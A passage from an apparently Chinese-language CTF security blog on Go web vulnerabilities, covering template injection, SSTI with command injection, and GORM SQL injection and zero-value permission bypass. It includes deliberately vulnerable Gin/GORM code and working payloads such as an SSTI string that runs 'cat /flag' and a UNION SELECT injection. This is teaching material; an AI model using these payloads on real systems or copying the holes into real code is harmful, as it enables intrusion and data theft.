    user <span class="token operator">:=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"admin@admin.com"</span><span class="token punctuation">,</span> Flag<span class="token punctuation">:</span> <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">}</span>
    msg <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">DefaultQuery</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span> <span class="token string">"helloworld"</span><span class="token punctuation">)</span>
    content <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"&lt;h1&gt;Hello {{ .Name}}&lt;/h1&gt; &lt;p&gt;Message: %s&lt;/p&gt;"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span>
    tmpl<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"UserInfo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">)</span>
    tmpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Writer<span class="token punctuation">,</span> user<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>

<p>index è·¯ç”±ä» GET å‚æ•°ä¸­è·å– msg å¹¶ç›´æ¥æ‹¼æ¥åˆ° <span class="hexo-wm">êœ±â€Œ3vğğ’â€¢â€â€‹ğ˜€ğ¢â€Œğ’•ğ˜¦â€</span>template å†…, åç»­â½£æˆæ¨¡ç‰ˆå†…å®¹çš„æ—¶å€™ä¼ â¼Šäº† user ç»“æ„ä½“, â½½ user ç»“æ„ä½“ä¸­å­˜åœ¨ Flag å­—æ®µ</p>
<p>ä½¿â½¤ {{ . }} å¯ä»¥æ˜¾ç¤ºå‡ºä¼ â¼Šçš„ç»“æ„ä½“çš„æ‰€æœ‰å­—æ®µçš„å€¼,<span class="hexo-wm">ğ¬â€Â³â…´ğï½â€¤â€‹Ñ•ğ¢ï»¿â€Œtï½…â€Œâ€Œ</span> ä»â½½é€ æˆä¿¡æ¯æ³„éœ², æ‹¿åˆ°flag</p>
<h3 id="2-2-å‘½ä»¤æ‰§è¡Œ"><a href="#2-2-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="2.2 å‘½ä»¤æ‰§è¡Œ"></a>2.2 å‘½ä»¤æ‰§è¡Œ</h3><p>å¦‚æœåœ¨â½£æˆæ¨¡ç‰ˆå†…å®¹çš„æ—¶å€™, ä¼ â¼Šçš„ç»“æ„ä½“å¯¹è±¡ä¸­å­˜åœ¨ç€â¼€äº›å¯è°ƒâ½¤çš„â½…æ³•,<span class="hexo-wm">êœ±â€‹â‘¶â…´â„¯ï½.ï»¿ğ’”ğ˜ªâ€â€‹ğ˜µâ„®â€‹ï»¿</span> é‚£ä¹ˆå¯ä»¥é€šè¿‡ SSTI æ¥è°ƒâ½¤ç»“æ„ä½“ä¸­çš„éƒ¨åˆ†â½…æ³•, å®ç° RCE</p>
<p>æ ¹æ® Go å®˜â½…â½‚æ¡£, <span class="hexo-wm">ğ˜´â€‹ï»¿ğŸ¯ğ˜·ğnï¼â€Œâ€ğ˜´ğ¢â€Œâ€‹ğ­eï»¿â€‹</span>è¢«è°ƒâ½¤çš„â½…æ³•å­˜åœ¨å¦‚ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li>å­˜åœ¨â¼€ä¸ªè¿”å›å€¼,<span class="hexo-wm">ğ˜€â€Œâ€ŒğŸ¯ğ˜·ğ˜¦nâˆ™â€‹â€‹siâ€â€tğ˜¦â€Œâ€Œ</span> å¯ä»¥ä¸ºä»»æ„ç±»å‹</li>
<li>å­˜åœ¨ä¸¤ä¸ªè¿”å›å€¼, ä¸”ç¬¬â¼€ä¸ªä¸ºä»»æ„ç±»å‹, <span class="hexo-wm">ğ˜€â€‹â‘¶ğ’—â„®ğ˜¯â€¢â€Œsiï»¿ï½”â„®ï»¿â€‹</span>ç¬¬â¼†ä¸ªä¸º error ç±»å‹</li>
</ul>
<p>eg.</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"html/template"</span>
    <span class="token string">"os/exec"</span>

    <span class="token string">"github.com/gin-gonic/gin"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    Name  <span class="token builtin">string</span>
    Email <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>u <span class="token operator">*</span>User<span class="token punctuation">)</span> <span class="token function">QueryProcess</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> u<span class="token punctuation">.</span>Name <span class="token operator">!=</span> <span class="token string">"admin"</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"You are not admin"</span>
    <span class="token punctuation">}</span>

    cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"ps -ef | grep "</span><span class="token operator">+</span>name<span class="token punctuation">)</span>
    output<span class="token punctuation">,</span> err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">CombinedOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token function">string</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> users <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User

<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    users <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token punctuation">)</span>
    users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"admin@admin.com"</span><span class="token punctuation">}</span>
    users<span class="token punctuation">[</span><span class="token string">"test"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"test@test.com"</span><span class="token punctuation">}</span>
    users<span class="token punctuation">[</span><span class="token string">"guest"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"guest@guest.com"</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    name <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">DefaultQuery</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span>
    content <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"{{ $u := index .users \"%s\" }}&lt;h1&gt;Hello {{ $u.Name }}, Your Email is {{ $u.Email }}&lt;/h1&gt;"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
    tmpl<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"UserInfo"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
    c<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">)</span>
    tmpl<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Writer<span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
        <span class="token string">"users"</span><span class="token punctuation">:</span> users<span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">Any</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>

<p>index è·¯ç”±å­˜åœ¨ SSTI,<span class="hexo-wm">sâ€Œâ€ŒğŸ¯vï½…ğ˜¯Â·â€siâ€‹ğ­eï»¿â€‹</span> å¹¶ä¸”ä¼ â¼Šäº† users ç»“æ„ä½“æ•°ç»„</p>
<p>åŒæ—¶ User ç»“æ„ä½“å­˜åœ¨ QueryProcess â½…æ³•, è¯¥â½…æ³•å°†ä¼ â¼Šçš„ name ç›´æ¥æ‹¼æ¥åˆ° <code>ps -ef | grep</code> åâ¾¯, å­˜åœ¨å‘½ä»¤æ³¨â¼Š</p>
<p>å› æ­¤, æˆ‘ä»¬å°±å¯ä»¥åˆ©â½¤ SSTI æ¥è°ƒâ½¤ User ç»“æ„ä½“çš„ <span class="hexo-wm">ğ˜´ï»¿â€ğŸ¯ğ’—â„¯ğ§ï¼â€Œsğ¢â€ï½”eâ€</span>QueryProcess â½…æ³•, é…åˆå‘½ä»¤æ³¨â¼Š, å®ç° RCE</p>
<p>æ„é€  payloadï¼š</p>
<pre class="language-none"><code class="language-none">/?name=admin%22}}{{+$u.QueryProcess%20%22|%20cat%20/flag</code></pre>

<h2 id="3-Gorm-ç›¸å…³"><a href="#3-Gorm-ç›¸å…³" class="headerlink" title="3. Gorm ç›¸å…³"></a>3. Gorm ç›¸å…³</h2><p>GORM æ˜¯ Go è¯­â¾”çš„â¼€ä¸ª ORM æ¡†æ¶, å®ƒå°† Go ä¸­çš„ struct ç±»å‹ä¸ SQL è¡¨ä¸­çš„æ•°æ®è¿›â¾æ˜ å°„,<span class="hexo-wm">êœ±â€ŒÂ³ğ’—ï½…nÂ·â€Œêœ±ï½‰ï»¿ğ­ğ˜¦â€</span> ç›¸è¾ƒäºç›´æ¥â¼¿å†™åŸâ½£çš„ SQL è¯­å¥, GORM çš„ä½¿â½¤â½…å¼æ›´åŠ å‹å¥½, å¼€å‘è€…ä¹Ÿæ›´å®¹æ˜“ä¸Šâ¼¿</p>
<p>GORM æä¾›äº† First, Take,<span class="hexo-wm">sâ€‹3ğ’—â„¯ğ’.â€Œêœ±iâ€Œğ’•ğ˜¦â€â€‹</span> Last ç­‰â½…æ³•ä»¥è¿›â¾ SQL æŸ¥è¯¢, â½½è¿™äº›â½…æ³•éƒ½â½€æŒä¸»é”®æ£€ç´¢</p>
<pre class="language-go" data-language="go"><code class="language-go">db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
<span class="token comment">// SELECT * FROM users WHERE id = 10;</span>
db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">)</span>
<span class="token comment">// SELECT * FROM users WHERE id = 10;</span>
db<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>users<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// SELECT * FROM users WHERE id IN (1,2,3);</span>
db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> <span class="token string">"name = ?"</span><span class="token punctuation">,</span> <span class="token string">"admin"</span><span class="token punctuation">)</span>
<span class="token comment">// SELECT * FROM users WHERE NAME= "admin"</span></code></pre>
<h3 id="3-1-SQL-æ³¨å…¥"><a href="#3-1-SQL-æ³¨å…¥" class="headerlink" title="3.1 SQL æ³¨å…¥"></a>3.1 SQL æ³¨å…¥</h3><p>å¯ä»¥çœ‹åˆ°, å¯¹äº First, Find è¿™äº›â½…æ³•, GORM <span class="hexo-wm">êœ±â€‹Â³vï½…ï½â€¢â€â€‹sğ¢ï»¿â€Œğ˜µğ˜¦â€â€‹</span>æä¾›äº†â¾¼åº¦çš„çµæ´»æ€§, â½…æ³•ä¼ â¼Šçš„ç¬¬â¼†ä¸ªå‚æ•°æ—¢å¯ä»¥æ˜¯æ•°å­—/å­—ç¬¦ä¸², ä¹Ÿå¯ä»¥æ˜¯â¼€ä¸ª Map å¯¹è±¡, ç”šâ¾„æ˜¯å¤æ‚çš„æŸ¥è¯¢æ¡ä»¶</p>
<p>æ ¹æ® GORM çš„å®˜â½…â½‚æ¡£, è¿™äº›â½…æ³•çš„ä½¿â½¤ä¹Ÿå­˜åœ¨ç€â¼€äº›éšæ‚£,<span class="hexo-wm">êœ±â€‹ğŸ¯â…´ï½…ğ˜¯â€¢â€Œâ€ŒÑ•ï½‰â€‹ğ’•ğ˜¦â€â€</span> å¦‚æœä½¿â½¤ä¸å½“åˆ™ä¼šé€ æˆ SQL æ³¨â¼Š</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token comment">// ä¼šè¢«è½¬ä¹‰</span>
db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> <span class="token string">"name = ?"</span><span class="token punctuation">,</span> userInput<span class="token punctuation">)</span>
<span class="token comment">// SQL æ³¨â¼Š</span>
db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"name = %v"</span><span class="token punctuation">,</span> userInput<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>eg.</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"os"</span>

    <span class="token string">"github.com/gin-gonic/gin"</span>
    <span class="token string">"gorm.io/driver/sqlite"</span>
    <span class="token string">"gorm.io/gorm"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    ID       <span class="token builtin">int</span> <span class="token string">`gorm:"primaryKey"`</span>
    Username <span class="token builtin">string</span>
    Email    <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token keyword">type</span> Flag <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    Flag <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> db <span class="token operator">*</span>gorm<span class="token punctuation">.</span>DB

<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    db<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">=</span> gorm<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span>sqlite<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"test.db"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>gorm<span class="token punctuation">.</span>Config<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    db<span class="token punctuation">.</span><span class="token function">AutoMigrate</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    db<span class="token punctuation">.</span><span class="token function">AutoMigrate</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Flag<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Username<span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"admin@admin.com"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Username<span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"test@test.com"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Username<span class="token punctuation">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> Email<span class="token punctuation">:</span> <span class="token string">"guest@guest.com"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
    db<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Flag<span class="token punctuation">{</span>Flag<span class="token punctuation">:</span> <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">IndexHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
        <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"helloworld"</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">QueryHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    id <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> id <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> user User
        db<span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">,</span> id<span class="token punctuation">)</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span> user<span class="token punctuation">.</span>Username<span class="token punctuation">,</span>
            <span class="token string">"email"</span><span class="token punctuation">:</span>    user<span class="token punctuation">.</span>Email<span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>
            <span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"no query id"</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>
    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/query"</span><span class="token punctuation">,</span> QueryHandler<span class="token punctuation">)</span>

    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":80"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>

<p>ç¨‹åºçš„ /query è·¯ç”±é€šè¿‡ä¼ â¼Šçš„ id <span class="hexo-wm">ğ˜´â€â€Â³ğ’—â„®ğ§Â·â€Œêœ±iâ€‹â€Œğ˜µï½…ï»¿</span>è¿›â¾ User æ•°æ®çš„æŸ¥è¯¢, å°½ç®¡ä½¿â½¤äº† GORM æ¡†æ¶,</p>
<p>ä½†å› ä¸º id å¹¶æ²¡æœ‰é™åˆ¶ä¸º int ç±»å‹,<span class="hexo-wm">sâ€‹ï»¿3ğ˜·ğ˜¦ğ˜¯â€¢â€Œâ€‹sğ¢â€‹ï½”ğâ€Œ</span> æ‰€ä»¥åœ¨è¿™â¾¥ä¹Ÿå¯ä»¥ç†è§£ä¸ºä¼ â¼Šçš„æ˜¯â¼€ä¸ª name = xxx æˆ–è€…å…¶å®ƒçš„æŸ¥è¯¢æ¡ä»¶, å­˜åœ¨ SQL æ³¨â¼Šçš„â»›é™©</p>
<p>Payloadï¼š</p>
<pre class="language-none"><code class="language-none">/query?id=id=1 union select 1,sqlite_version(),(select flag from flags) --+</code></pre>

<h3 id="3-2-æƒé™ç»•è¿‡"><a href="#3-2-æƒé™ç»•è¿‡" class="headerlink" title="3.2 æƒé™ç»•è¿‡"></a>3.2 æƒé™ç»•è¿‡</h3><p>GORM çš„ Where <span class="hexo-wm">Ñ•â€Œ3ğ˜·enâ€¢â€Œğ˜€â…ˆâ€‹ğ’•â„®â€Œ</span>â½…æ³•â½€æŒä¼ â¼Š Struct / Map è¿›â¾æŸ¥è¯¢</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token comment">// Struct</span>
db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>User<span class="token punctuation">{</span>Name<span class="token punctuation">:</span> <span class="token string">"jinzhu"</span><span class="token punctuation">,</span> Age<span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>user<span class="token punctuation">)</span>
<span class="token comment">// SELECT * FROM users WHERE name = "jinzhu" AND age = 20 ORDER BY id LIMIT 1;</span>
<span class="token comment">// Map</span>
db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"jinzhu"</span><span class="token punctuation">,</span> <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>users<span class="token punctuation">)</span>
<span class="token comment">// SELECT * FROM users WHERE name = "jinzhu" AND age = 20;</span>
<span class="token comment">// Slice of primary keys</span>
db<span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int64</span><span class="token punctuation">{</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>users<span class="token punctuation">)</span>
<span class="token comment">// SELECT * FROM users WHERE id IN (20, 21, 22);</span></code></pre>

<p>ä½†æ˜¯å¯¹äº Struct çš„æŸ¥è¯¢, GORM åªä¼šæŸ¥è¯¢ â€œâ¾®é›¶å­—æ®µâ€, å³å¦‚æœ Struct å†…çš„æŸä¸ªå­—æ®µå€¼ä¸º 0 ,<span class="hexo-wm">Ñ•ï»¿Â³â…´â„¯ğ§Â·ï»¿ï»¿ğ¬iâ€‹ï»¿ğ˜µeï»¿</span> â€˜â€™ , false , GORM åˆ™ä¸ä¼šä½¿â½¤è¯¥å­—æ®µæ„å»ºæŸ¥è¯¢æ¡ä»¶</p>
<p><img src="image-1.png" alt="image-1.png"></p>
<p>è¿™åœ¨æŸäº›æƒ…å†µä¸‹,<span class="hexo-wm">sâ€Œâ€â‘¶ğ’—ğğ§âˆ™â€Œêœ±ğ¢â€Œâ€ğ’•eï»¿â€</span> å¯èƒ½ä¼šé€ æˆ â€œæƒé™ç»•è¿‡â€</p>
<p>eg.</p>
<pre class="language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
    <span class="token string">"crypto/md5"</span>
    <span class="token string">"crypto/rand"</span>
    <span class="token string">"fmt"</span>
    <span class="token string">"os"</span>

    <span class="token string">"github.com/gin-contrib/sessions"</span>
    <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>
    <span class="token string">"github.com/gin-gonic/gin"</span>
    <span class="token string">"gorm.io/driver/sqlite"</span>
    <span class="token string">"gorm.io/gorm"</span>
<span class="token punctuation">)</span>

<span class="token keyword">type</span> User <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    ID       <span class="token builtin">int</span> <span class="token string">`gorm:"primaryKey"`</span>
    Username <span class="token builtin">string</span>
    Password <span class="token builtin">string</span>
    Role     <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> db <span class="token operator">*</span>gorm<span class="token punctuation">.</span>DB

<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    randBytes <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>
    rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>randBytes<span class="token punctuation">)</span>
    h <span class="token operator">:=</span> md5<span class="token punctuation">.</span><span class="token function">Sum</span><span class="token punctuation">(</span>randBytes<span class="token punctuation">)</span>
    randPassword <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span>

